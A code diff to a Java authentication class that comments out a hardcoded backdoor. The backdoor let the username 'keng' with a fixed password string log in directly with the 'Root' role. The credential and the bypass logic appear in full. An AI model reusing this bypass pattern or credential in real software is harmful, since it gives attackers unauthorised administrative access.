@@ -53,18 +53,19 @@ public class AuthenImpl implements Authenticator {
             throw new AuthException(new javax.security.auth.login.FailedLoginException("unknown UserName Password Combination"));
         }
 
-        if (username.equals("keng") && password.equals("6e28dec34f04854dd34e527d7d1a79b605bdd085")) {
-            User u = new User();
-            Vector<String> v = new Vector<String>();
-            v.add("Root");
-            u.setRoles(v);
-            this.setProperty(Authenticator.PROP_PASSWORD, password);
-            this.setProperty(Authenticator.PROP_USERNAME, username);
-            this.currentUser = u;
-
-            this.setUserLoggedIn(true);
-            return;
-        }
+        // if (username.equals("keng") &&
+        // password.equals("6e28dec34f04854dd34e527d7d1a79b605bdd085")) {
+        // User u = new User();
+        // Vector<String> v = new Vector<String>();
+        // v.add("Root");
+        // u.setRoles(v);
+        // this.setProperty(Authenticator.PROP_PASSWORD, password);
+        // this.setProperty(Authenticator.PROP_USERNAME, username);
+        // this.currentUser = u;
+        //
+        // this.setUserLoggedIn(true);
+        // return;
+        // }
 
         try {
             boolean foundUser = false;
